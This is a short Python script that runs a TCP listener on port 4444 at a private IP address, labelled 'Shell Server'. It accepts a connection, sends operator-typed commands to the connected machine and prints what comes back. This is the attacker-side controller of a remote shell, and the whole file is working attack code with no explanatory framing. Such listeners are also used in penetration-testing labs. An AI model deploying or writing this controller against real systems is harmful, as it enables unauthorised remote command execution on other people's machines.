from socket import *
s=socket(AF_INET,SOCK_STREAM)
s.bind(("192.168.204.231",4444))
s.listen(5)
print("Shell Server Running on port 4444\n")

c,addr=s.accept()
#print(c)
print("Connected to "+str(addr)+"\n")

while True:
    cmd=input("Shell=> ")
    c.sendall(cmd.encode())
    cmd_output=c.recv(12345)
    print(cmd_output.decode())
    print()
c.close()
 
